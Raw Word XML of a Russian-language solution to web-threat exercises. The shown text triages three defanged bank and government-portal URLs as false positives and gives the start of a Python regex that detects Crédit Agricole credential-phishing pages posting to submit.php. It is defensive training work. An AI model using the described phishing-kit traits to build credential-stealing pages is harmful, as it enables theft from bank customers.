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625D" w:rsidRPr="00331A0C" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="aa"/>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00331A0C">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Решение заданий по анализу веб угроз</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="000E55A5" w:rsidRDefault="000E55A5">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Абдурашидов М</w:t>
      </w:r>
      <w:r w:rsidRPr="000E55A5">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Ш</w:t>
      </w:r>
      <w:r w:rsidRPr="000E55A5">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="00331A0C" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00331A0C">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Задание 1 Проверка ссылок</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="00331A0C" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00331A0C">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">1 Ссылка с таргетом </w:t>
      </w:r>
      <w:r>
        <w:t>Commerzbank</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="00331A0C" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00331A0C">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">Адрес: </w:t>
      </w:r>
      <w:r>
        <w:t>hxxps</w:t>
      </w:r>
      <w:r w:rsidRPr="00331A0C">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>://</w:t>
      </w:r>
      <w:r>
        <w:t>www</w:t>
      </w:r>
      <w:r w:rsidRPr="00331A0C">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>kreditkartenbanking</w:t>
      </w:r>
      <w:r w:rsidRPr="00331A0C">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>[.]</w:t>
      </w:r>
      <w:r>
        <w:t>de</w:t>
      </w:r>
      <w:r w:rsidRPr="00331A0C">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>cas</w:t>
      </w:r>
      <w:r w:rsidRPr="00331A0C">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>dispatch</w:t>
      </w:r>
      <w:r w:rsidRPr="00331A0C">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>do</w:t>
      </w:r>
      <w:r w:rsidRPr="00331A0C">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
      <w:r>
        <w:t>bt</w:t>
      </w:r>
      <w:r w:rsidRPr="00331A0C">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:t>PRELON</w:t>
      </w:r>
      <w:r w:rsidRPr="00331A0C">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>=1&amp;</w:t>
      </w:r>
      <w:r>
        <w:t>ref</w:t>
      </w:r>
      <w:r w:rsidRPr="00331A0C">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>=1500_</w:t>
      </w:r>
      <w:r>
        <w:t>COBA</w:t>
      </w:r>
      <w:r w:rsidRPr="00331A0C">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:t>service</w:t>
      </w:r>
      <w:r w:rsidRPr="00331A0C">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:t>COS</w:t>
      </w:r>
      <w:r w:rsidRPr="00331A0C">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:t>error</w:t>
      </w:r>
      <w:r w:rsidRPr="00331A0C">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:t>sto</w:t>
      </w:r>
      <w:r w:rsidRPr="00331A0C">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="00331A0C" w:rsidRDefault="009D74D2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>False</w:t>
      </w:r>
      <w:r w:rsidRPr="00331A0C">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>positive</w:t>
      </w:r>
      <w:r w:rsidRPr="00331A0C">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">. По совокупности доступных данных это сервис кредитных карт </w:t>
      </w:r>
      <w:r>
        <w:t>Commerzbank</w:t>
      </w:r>
      <w:r w:rsidRPr="00331A0C">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="00E91E50" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">Что проверено: точный адрес открывает страницу с заголовком </w:t>
      </w:r>
      <w:r w:rsidR="009D74D2" w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>“</w:t>
      </w:r>
      <w:r>
        <w:t>Commerzbank</w:t>
      </w:r>
      <w:r w:rsidR="009D74D2" w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">. Форма отправляет данные в </w:t>
      </w:r>
      <w:r>
        <w:t>dispatch</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>do</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> на том же домене. На странице указаны контакты кредитного сервиса банка, ссылки на документы </w:t>
      </w:r>
      <w:r>
        <w:t>Commerzbank</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> и изображения с </w:t>
      </w:r>
      <w:r>
        <w:t>commerzbank</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>de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Что не стало доказательством: домен отличается от </w:t>
      </w:r>
      <w:r>
        <w:t>commerzbank</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>de</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">, но у банка может быть отдельный карточный сервис. Параметры </w:t>
      </w:r>
      <w:r>
        <w:t>ref</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>=1500_</w:t>
      </w:r>
      <w:r>
        <w:t>COBA</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:r>
        <w:t>service</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:t>COS</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> похожи на обычные настройки сервиса, сами по себе они ничего не доказывают. Логотип, </w:t>
      </w:r>
      <w:r>
        <w:t>HTTPS</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> и ссылки на банк тоже можно скопировать.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:t>2 Ссылка с таргетом Banco Santander</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Адрес: hxxps://santander[.]consorciei[.]com[.]br/</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="009D74D2" w:rsidRDefault="009D74D2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>False</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>positive</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">. Доступные сведения указывают на сервис </w:t>
      </w:r>
      <w:r>
        <w:t>Consorciei</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> для клиентов </w:t>
      </w:r>
      <w:r>
        <w:t>Santander</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>, а не на поддельный банк.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Что проверено: основной домен здесь </w:t>
      </w:r>
      <w:r>
        <w:t>consorciei</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>com</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>br</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">, а </w:t>
      </w:r>
      <w:r>
        <w:t>santander</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> — его поддомен. У </w:t>
      </w:r>
      <w:r>
        <w:t>Consorciei</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> есть отдельная страница.</w:t>
      </w:r>
      <w:r w:rsidR="00956D43">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">На странице компании </w:t>
      </w:r>
      <w:r>
        <w:t>Santander</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> также перечислен среди партнёров. Проверяемый адрес отдаёт страницу с названием </w:t>
      </w:r>
      <w:r>
        <w:t>Login</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.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Что не стало доказательством: название банка в поддомене сначала выглядит подозрительно, но так устроены и партнёрские сервисы. Один </w:t>
      </w:r>
      <w:r>
        <w:t>HTTPS</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> или рейтинг стороннего сервиса не подтверждает легитимность. Здесь важнее назначение платформы и сведения о её работе с </w:t>
      </w:r>
      <w:r>
        <w:t>Santander</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">. 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br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="009D74D2" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Задание 1 Продолжение</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="009D74D2" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>3 Ссылка с таргетом Госуслуги</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Адрес: hxxps://uslugi-mosreg[.]ru/</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="009D74D2" w:rsidRDefault="00C72D02">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>False</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>positive</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> по доступному содержимому страницы. Это не официальный портал, но признаков кражи учётных данных Госуслуг в просмотренном </w:t>
      </w:r>
      <w:r>
        <w:t>HTML</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> не найдено.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="00FF5AE4" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">Что проверено: </w:t>
      </w:r>
      <w:r>
        <w:t>uslugi</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t>mosreg</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>ru</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:r>
        <w:t>uslugi</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>mosreg</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>ru</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> — разные домены. Первый содержит статью о регистрации, входе и услугах регионального портала. Внизу есть указание на информационный характер сайта. В основном </w:t>
      </w:r>
      <w:r>
        <w:t>HTML</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> нет формы ввода логина и пароля. Виджет</w:t>
      </w:r>
      <w:r w:rsidR="00FF5AE4">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> на </w:t>
      </w:r>
      <w:r w:rsidR="00FF5AE4">
        <w:t>pravoved</w:t>
      </w:r>
      <w:r w:rsidR="00FF5AE4" w:rsidRPr="00FF5AE4">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00FF5AE4">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>в конце сайта не прогружается.(</w:t>
      </w:r>
      <w:r w:rsidR="00FF5AE4">
        <w:t>PR</w:t>
      </w:r>
      <w:r w:rsidR="00FF5AE4" w:rsidRPr="00FF5AE4">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r w:rsidR="00FF5AE4">
        <w:t>END</w:t>
      </w:r>
      <w:r w:rsidR="00FF5AE4" w:rsidRPr="00FF5AE4">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r w:rsidR="00FF5AE4">
        <w:t>OF</w:t>
      </w:r>
      <w:r w:rsidR="00FF5AE4" w:rsidRPr="00FF5AE4">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r w:rsidR="00FF5AE4">
        <w:t>FILE</w:t>
      </w:r>
      <w:r w:rsidR="00FF5AE4" w:rsidRPr="00FF5AE4">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r w:rsidR="00FF5AE4">
        <w:t>ERROR</w:t>
      </w:r>
      <w:r w:rsidR="00FF5AE4">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>)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Что не стало доказательством: похожее имя домена и заголовок «Единый портал госуслуг» вызывают подозрение, но этого недостаточно для </w:t>
      </w:r>
      <w:r>
        <w:t>TP</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>. Слова «вход» и «регистрация» используются и в статьях-инструкциях. Описание того, какие данные нужны на официальном портале, не равно сбору этих данных на самой странице.</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="009D74D2" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Задание 2 Регулярное выражение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>В трёх фишинговых файлах совпадает заголовок «</w:t>
      </w:r>
      <w:r>
        <w:t>Acc</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>è</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>CR</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:r>
        <w:t>Cr</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>é</w:t>
      </w:r>
      <w:r>
        <w:t>dit</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Agricole</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">». Их формы отправляются методом </w:t>
      </w:r>
      <w:r>
        <w:t>POST</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> в </w:t>
      </w:r>
      <w:r>
        <w:t>submit</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>php</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> или ../</w:t>
      </w:r>
      <w:r>
        <w:t>submit</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>php</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">. Внутри формы есть выбор регионального банка с именем </w:t>
      </w:r>
      <w:r>
        <w:t>region</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:t>caisse</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> или </w:t>
      </w:r>
      <w:r>
        <w:t>bobiz</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>. Я объединил эти признаки в одной сигнатуре.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Регулярное выражение для </w:t>
      </w:r>
      <w:r>
        <w:t>Python</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>re</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>. Ниже оно записано в режиме (?</w:t>
      </w:r>
      <w:r>
        <w:t>isx</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>): переносы и отступы в самом выражении игнорируются.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="00196582" w:rsidRDefault="00E91E50">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00196582">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>(?isx)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="00196582" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00196582">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;title&gt;\s*Accès\s+CR\s*-\s*Crédit\s+Agricole\s*&lt;/title&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="00196582" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00196582">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>.*?&lt;form\b</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="00196582" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00196582">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>(?=[^&gt;]*\bmethod\s*=\s*["']post["'])</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="00196582" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00196582">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>(?=[^&gt;]*\baction\s*=\s*["'](?:\.\./|\./)?submit\.php["'])</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="00196582" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00196582">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>[^&gt;]*&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="00196582" w:rsidRDefault="00000000">
      <w:pPr>
